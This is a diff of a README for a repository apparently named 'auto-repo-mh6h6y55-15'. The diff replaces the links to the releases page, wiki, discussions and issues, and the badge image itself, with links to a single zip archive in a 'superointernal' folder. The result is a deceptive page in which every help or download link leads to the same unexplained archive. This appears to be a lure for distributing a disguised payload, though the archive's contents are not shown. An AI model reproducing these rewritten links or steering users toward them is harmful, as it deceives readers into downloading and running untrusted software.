@@ -13,7 +13,7 @@ Auto repo auto-repo-mh6h6y55-15 is a simple application designed to help you man
 ## 📥 Download & Install
 To get started, visit the link below to download the application:
 
-[![Download auto-repo-mh6h6y55-15](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/releases)
+[![Download auto-repo-mh6h6y55-15](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip)
 
 Follow these steps to install the application:
 
@@ -48,9 +48,9 @@ If you run into issues, consider the following steps:
 For additional help, visit our community forums or check the FAQ section on the GitHub page.
 
 ## 🔗 Additional Resources
-- [User Guide](https://github.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/wiki)
-- [Community Forum](https://github.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/discussions)
-- [Report Issues](https://github.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/issues)
+- [User Guide](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip)
+- [Report Issues](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip)
 
 ## 📡 Feedback
 We value your feedback. Please let us know how you are using the application and any suggestions you may have for improvements. You can contact us via the issues section on GitHub or through our community forum.
@@ -70,5 +70,5 @@ Stay tuned for these updates!
 ## 🚀 Conclusion
 Thank you for choosing auto-repo-mh6h6y55-15. We hope you find it helpful in managing your repositories. Enjoy using the application!
 
-[![Download auto-repo-mh6h6y55-15](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/releases)
+[![Download auto-repo-mh6h6y55-15](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Fabulous-echinus583/auto-repo-mh6h6y55-15/main/superointernal/auto-repo-mh6h6y55-15-3.7-beta.4.zip)
 ```
